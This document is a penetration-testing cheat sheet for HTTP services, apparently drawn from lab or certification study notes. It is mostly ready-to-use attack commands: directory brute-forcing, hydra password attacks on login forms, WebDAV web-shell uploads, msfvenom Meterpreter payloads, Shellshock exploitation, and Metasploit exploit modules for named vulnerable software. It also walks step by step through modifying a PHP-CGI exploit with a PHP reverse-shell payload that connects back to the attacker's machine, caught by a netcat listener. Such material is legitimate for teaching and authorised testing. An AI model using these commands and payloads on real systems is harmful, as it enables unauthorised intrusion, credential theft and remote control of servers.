
# HTTP

**HTTP (Hypertext Transfer Protocol)**  
**Description**: HTTP (Hypertext Transfer Protocol) is used for serving web content
**Ports**: TCP 80 (HTTP), TCP 443 (HTTPS)  
**Known Vulnerabilities**: Directory traversal, RCE via web apps (PHP, CGI, Apache modules), WebDAV misconfigs, Vulnerable CMS (e.g., ProcessMaker), Shellshock, PHP CGI injection, Auth bypasses

<br>

# Basic HTTP - Enumeration

```shell
curl http://<target_IP>
# Sends a basic HTTP request and displays the response (usually the homepage).

curl -I http://<target_IP>
# Fetch HTTP headers only.

curl -u <username>:<password> http://<target_IP>/secure/
# Sends a request with basic HTTP authentication using the provided username and password.

curl -X OPTIONS http://<target_IP> -i
# Check allowed HTTP methods (OPTIONS, PUT, DELETE, etc.).

curl -X POST -d 'username=admin&password=admin' http://<target_IP>/login.php
# Sends a POST request with login data.

curl -X PUT -d "Test Upload" http://<target_IP>/uploads/test.txt
# Uploads data using HTTP PUT to a specific file path.

dirb <target>
# Brute-force discover directories on the target.

dirb <target> -w /usr/share/dirb/wordlists/big.txt -X .bak,.tar.gz,.zip,.sql,.bak.zip
gobuster dir -u http://<target_IP> -w /usr/share/wordlists/dirb/common.txt -x php
# Find backup and archive files by brute-forcing extensions.

ffuf -u http://<target_IP>/FUZZ -w <wordlists>
# Fast fuzzing for directories and files.

gobuster dir -u http://<target_IP> -w <wordlists>
# Scan for directories using a wordlist.

httrack <target> -O target_site.html
# Mirrors the full website to your machine.

nc <target_IP> 80
# Opens a raw TCP connection to port 80 (HTTP) on the target — useful for manual HTTP requests.

<target>/robots.txt
# As we know, the robots.txt file tells search engines what to crawl and what to avoid.

wget http://<target_IP>/index.html
# Downloads the index.html file from the target web server to your machine.
```

<br>

# Metasploit Modules

```shell
use auxiliary/scanner/http/apache_userdir_enum
# Enumerates Apache UserDir usernames (e.g., ~user)

use auxiliary/scanner/http/brute_dirs
# Brute-forces directories on the target web server

use auxiliary/scanner/http/dir_listing
# Checks for directory listing enabled at a specific path
set PATH /data

use auxiliary/scanner/http/dir_scanner
# Scans for directories using a wordlist
set DICTIONARY /usr/share/metasploit-framework/data/wordlists/directory.txt

use auxiliary/scanner/http/files_dir
# Attempts to identify accessible files in a given directory

use auxiliary/scanner/http/http_header
# Retrieves and displays HTTP headers from the server

use auxiliary/scanner/http/http_login
# Performs brute-force login attempts on HTTP basic auth

use auxiliary/scanner/http/http_put
# Attempts to upload a file using the HTTP PUT method
set RHOSTS <target_IP>
set FILENAME test.txt
set FILEDATA "Hello world"

use auxiliary/scanner/http/http_version
# Detects the HTTP server version and banner

use auxiliary/scanner/http/robots_txt
# Reads and displays the contents of /robots.txt
```

<br>

# Brute force

Brute-force HTTP Basic Authentication on a web server by trying multiple passwords

```shell
curl -I http://<target>/ 
# If you see this in the response headers, that's HTTP Basic Auth
# HTTP/1.1 401 Unauthorized
# WWW-Authenticate: Basic realm="something"

# If it’s HTTP Basic Auth
hydra -L <users_list> -P <password_list> <target> http-get <path>
# Performs brute-force HTTP GET authentication using user and password lists.

dirb http://<target> -a <user>:<password>
# Brute-forces directories on the target web server using HTTP basic authentication.

# If it’s Form-Based Login
hydra -L <users_list> -P <password_list> <target> http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid username or password"
# Command used to perform a brute-force attack against a web login form.
```

<br>

# Scanning with WMAP

```shell
# Start Metasploit and load the WMAP extension that is used to perform web application assessments inside Metasploit.
load wmap

wmap_sites -a <target_IP>
# This adds the target IP as a "site" for WMAP to analyze.

wmap_targets -t http://<target_IP>
# This defines the protocol + IP or domain for the actual scan.

wmap_sites -l
# Lists added WMAP sites.

wmap_targets -l
# Lists configured WMAP targets.

wmap_run -t
# It does NOT test for vulnerabilities, just maps the site.
# This scans the site for links, pages, and parameters — like a crawler.

wmap_run -e
# This performs actual vulnerability checks like XSS, SQLi, file upload issues, etc.

<target_IP>/phpinfo.php
# Accesses the phpinfo() page — reveals PHP version, configuration, server paths, and sometimes environment variables.
# Useful for identifying LFI, RCE, and other PHP-based vulnerabilities.
```

<br>

# Tomcat JSP Upload Bypass

```shell
use exploit/multi/http/tomcat_jsp_upload_bypass
# Apache Tomcat v8.5.19 is vulnerable
# Exploits Apache Tomcat servers by uploading a JSP shell via a bypass technique
```

<br>

# WebDAV - Microsoft IIS

1. Using DAVTest and Cadaver

```shell
cadaver http://<target_IP>/webdav
# Interactive WebDAV client for manual file upload/download.

davtest -url http://<target_IP>/webdav
# Tests enabled WebDAV methods and tries to upload test files.

davtest -auth <username>:<password> -url http://<target_IP>/webdav
# Same as above but with basic authentication.

put /usr/share/webshells/asp/webshell.asp
# Uploads a backdoor web shell using cadaver or other WebDAV tools.

http://<target_IP>/webdav/webshell.asp
# Access the uploaded web shell in the browser to run commands.

```

2. Using Metasploit, Msfvenom and Cadaver

```shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<my_IP> LPORT=1234 -f asp > backdoor.asp
# Creates an ASP Meterpreter reverse shell payload.

# Upload the payload to the target machine
cadaver http://<target_IP>/webdav
# Username and Password

put /root/backdoor.asp
# Uploads the generated backdoor to the WebDAV folder.

use multi/handler
# Launches the Metasploit listener to catch the reverse shell connection.
set payload windows/meterpreter/reverse_tcp
set LHOST <kali_IP>
set LPORT 1234
```

3. Using Metasploit

```shell
use exploit/windows/iis/iis_webdav_upload_asp
# Exploits vulnerable IIS WebDAV servers by uploading an ASP web shell.
set PATH /webdav/metasploit.asp # metasploit%RAND%.asp
# %RAND% is a Metasploit variable that generates a random string when the exploit runs. It helps avoid overwriting and increases stealth. Fixed filenames can be useful for manual execution but might be detected more easily.
```

<br>

# Shellshock Exploit (Apache CGI)

```shell
# Check the CGI script.
<address>/<script_name>.cgi 
# Access a CGI script directly in the browser or via curl.

# Apache httpd 2.4.6
# Example version known to be vulnerable to Shellshock.

ls -al /usr/share/nmap/scripts | grep -e "shellshock"
# Locate Nmap scripts related to Shellshock.

nmap --script-help "*shellshock*"
# Display help info for all Nmap Shellshock-related scripts.

nmap -sV --script http-shellshock --script-args uri=/gettime.cgi,cmd=ls <target_IP>
# Scans and attempts Shellshock using a target CGI script with a command.

nmap -sV --script http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" <target_IP>
# Same as above — another format for defining the target URI.

use exploit/multi/http/apache_mod_cgi_bash_env_exec
# Metasploit module that exploits Shellshock via vulnerable Apache mod_cgi.
set RHOSTS <target_IP>
set TARGETURI <path_to_CGI_script>
set LHOST <my_IP>
```

<br>

# BadBlue

```shell
# 80/tcp | open  http | BadBlue httpd 2.7
use exploit/windows/http/badblue_passthru
# Exploits BadBlue HTTP server by executing system commands via a passthrough vulnerability.
```

<br>

# Rejetto

```shell
# HttpFileServer httpd 2.3
use exploit/windows/http/rejetto_hfs_exec
```

<br>

# Process Maker

```shell
use exploit/multi/http/processmaker_exec
set WORKSPACE workflow
```

<br>

# Xoda file upload 

```shell
use exploit/unix/webapp/xoda_file_upload
# Exploits XODA by uploading a malicious PHP file via unrestricted file upload.
# Allows remote code execution once the payload is accessed.
set TARGETURI /
set LHOST
```

<br>

# WordPress

```shell
gobuster dir -u http://<target>/plugins/ -w /usr/share/nmap/nselib/data/wp-plugins.lst
# Scans for existing WordPress plugins by brute-forcing the /plugins/ directory using a known plugin wordlist.

# e.g.
gobuster dir -u http://target2.ine.local/wp-content/plugins/ -w /usr/share/nmap/nselib/data/wp-plugins.lst

use auxiliary/scanner/http/wp_duplicator_file_read
# Scans for and exploits an information disclosure vulnerability in the Duplicator plugin for WordPress.
# Allows reading sensitive files (e.g., database configs) if backup files are exposed.
set RHOSTS
run 

# Now, the third flag is in the root directory. Let’s read it by setting the FILEPATH to /flag3.txt
set FILEPATH /flag3.txt
```


<br>

# Targeting PHP 

**Metasploit**

```shell
# Check the PHP version via web browser 
# PHP < 5.3.12 / < 5.4.2 - CGI Argument Injection
use exploit/multi/http/php_cgi_arg_injection
# Exploits vulnerable PHP-CGI setups by injecting arguments into the PHP interpreter.
# Leads to remote code execution if successful.
```

**Different approach**

```shell
# Step 1: Download the exploit using SearchSploit
searchsploit -m 18836.py # Copy exploit to current directory
vim 18836.py # Open the script to review

# Step 2: Run the original exploit to confirm code execution
python2 18836.py <target_IP> 80  # You may see 'phpinfo' output, confirming RCE is possible

# Step 3: Modify the exploit to include a reverse shell payload
vim 18836.py
# Replace the payload with a reverse shell (insert your Kali IP)
# Try file descriptor 3 first
pwn_code = """<?php $sock=fsockopen("<kali_IP>", 1234); exec("/bin/sh -i <&3 >&3 2>&3"); ?>"""
:wq # Save and exit

# Step 4: Start a Netcat listener in a new terminal
nc -nvlp 1234 # Listen for the reverse shell on port 1234

# Step 5: Run the exploit again to trigger the reverse shell
python2 18836.py <target_IP> 80

# Step 6: If no shell appears, change the file descriptor (e.g., to 4)
vim 18836.py
pwn_code = """<?php $sock=fsockopen("<kali_IP>", 1234); exec("/bin/sh -i <&4 >&4 2>&4"); ?>"""
:wq # Save and exit

# Restart the listener and run the exploit again
nc -nvlp 1234
python2 18836.py <target_IP> 80

# Step 7: Once connected, upgrade the shell if needed
/bin/bash -i # Get an interactive shell

# Step 8: Verify you’re inside the web server environment
pwd # Should be something like /var/www
cat /etc/*release # Check Linux distribution

# Note: This manual method helps understand the process deeply.
# The same result could be achieved with Metasploit, but this offers better control.
```

<br>

# Exploitation MSF Modules

```shell
exploit/multi/http/glassfish_deployer
# Exploits GlassFish Server's admin deployment feature to upload a WAR file and achieve RCE.
# Vulnerable versions: GlassFish Server 3.x and 4.x (with admin interface exposed).

exploit/linux/http/vcms_upload
# Exploits an unauthenticated file upload vulnerability in VCMS to get remote code execution.
# Vulnerable version: VCMS 0.9.8 and possibly earlier.

exploit/multi/http/werkzeug_debug_rce
# Exploits exposed Werkzeug debugger in Flask apps to execute Python code remotely.
# Vulnerable versions: Flask apps using Werkzeug debugger in debug mode (commonly before proper production hardening).
```
